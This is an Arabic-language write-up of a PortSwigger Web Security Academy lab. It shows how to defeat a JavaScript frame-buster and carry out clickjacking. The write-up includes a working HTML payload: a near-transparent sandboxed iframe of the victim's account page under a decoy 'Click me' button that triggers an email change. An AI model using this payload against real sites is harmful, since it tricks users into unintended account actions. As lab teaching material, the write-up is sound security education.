# Lab : Clickjacking with a frame buster script

https://portswigger.net/web-security/clickjacking/lab-frame-buster-script

- الفكره من ال Lab  ده ان بحاول اعمل صفحه decoy تظهر فوق الصفحه الرايسيه بس فس حمايه بسيطه من الframe buster script فا انا المفروض اتخطاها واغير الemail عنطريق اني اعمل decoy و التارحت بغير الemail عن طريق النقر علي زرار{ هنستخدم function اسمها sandbox }

```bash
1. <style>
    iframe {
        position:relative;
        width:700px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:465px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a57008c04f9481c81643417008c003f.web-security-academy.net/my-account?email=test4@test.CA" sandbox="allow-forms"></iframe>
```

## Clickjacking with a frame buster script

ده لاب من معمل PortSwigger Web Security Academy، وبيشرح فكرة إن الموقع بيحاول يحمي نفسه من هجوم الـ Clickjacking باستخدام كود JavaScript (يُسمى "frame buster" أو "frame killer")، لكن المهاجم بيقدر يتحايل عليه.

### فكرة الهجوم الأساسية (Clickjacking)

المهاجم بيعمل صفحة وهمية وبيحط فيها iframe للموقع الحقيقي (الضحية)، وبيخلي الـ iframe ده شفاف (transparent) أو مخفي جزئيًا، وبيحط زرار وهمي فوقه. المستخدم لما يدوس على الزرار اللي شايفه، هو فعليًا بيدوس على زرار حقيقي جوه الموقع المستهدف (زي "Delete Account" أو "Confirm Transfer") من غير ما يحس.

### دور الـ Frame Buster

عشان يمنعوا الهجوم ده، بعض المواقع بتحط سكريبت جافاسكريبت جوه الصفحة بيتأكد إن الصفحة مش متحملة جوه iframe، ولو لقاها كده بيعمل حاجة زي:

javascript

```jsx
if (top !== self) {
  top.location = self.location;
}
```

يعني لو الصفحة اتحطت جوه frame، السكريبت ده بيحاول "يكسر" الفريم ده (يطلع منه أو يعيد تحميل الصفحة في النافذة الرئيسية).

### هدف اللاب

الهدف من اللاب إنك تتعلم إزاي المهاجم يقدر **يلف حول (bypass)** الحماية دي. من أشهر الطرق:

1. **استخدام الـ `sandbox` attribute** في الـ iframe:

html

```html
<iframe src="https://vulnerable-website.com" sandbox="allow-forms"></iframe>
```

لما تحط `sandbox` من غير `allow-top-navigation`، بتمنع الـ frame buster إنه يعمل `top.location = self.location` لأنه بيمنع أي navigation للنافذة العليا — بس السكريبتات التانية جوه الصفحة (زي الفورم نفسه) ممكن تفضل شغالة.

1. الهدف النهائي إنك توصل لصفحة فيها iframe يحتوي على الموقع الضحية، وتخلي زرار حقيقي (زي "Delete account") متراكب مع زرار وهمي بتاعك، وتثبت إن اللاب اتحل لما "الضحية" يدوس ويعمل الأكشن من غير ما يقصد.
